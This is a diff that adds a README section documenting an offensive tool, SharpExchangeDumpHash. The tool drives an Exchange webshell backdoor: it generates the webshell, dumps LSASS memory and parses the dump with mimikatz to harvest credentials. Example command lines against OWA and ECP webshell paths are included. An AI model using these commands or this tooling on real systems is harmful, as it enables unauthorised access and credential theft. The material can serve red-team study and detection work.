@@ -589,6 +589,36 @@ eg.
     mail.test.com CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF ecp    
 ```
 
+---
 
+## SharpExchangeDumpHash.cs
+
+Use to send payload to the Exchange webshell backdoor.
+The communication is encrypted by AES.
+
+Support function:
+
+- generate : generate the webshell
+- dumplsass: save the dump file of LSASS to C:\\Windows\\Temp\\lsass.bin
+- parsedump: use mimikatz to load C:\\Windows\\Temp\\lsass.bin and save the results to C:\\Windows\\Temp\\mimikatz.log
+
+Usage:
+
+```
+    <url> <user> <password> <mode>
+```
+
+mode:
+
+- generate
+- dumplsass
+- parsedump
+
+eg.
+
+```
+    SharpExchangeDumpHash.exe https://192.168.1.1/owa/auth/1.aspx no auth dumplsass
+    SharpExchangeDumpHash.exe https://192.168.1.1/ecp/Education.aspx user1 123456 parsedump
+```
 
 ---
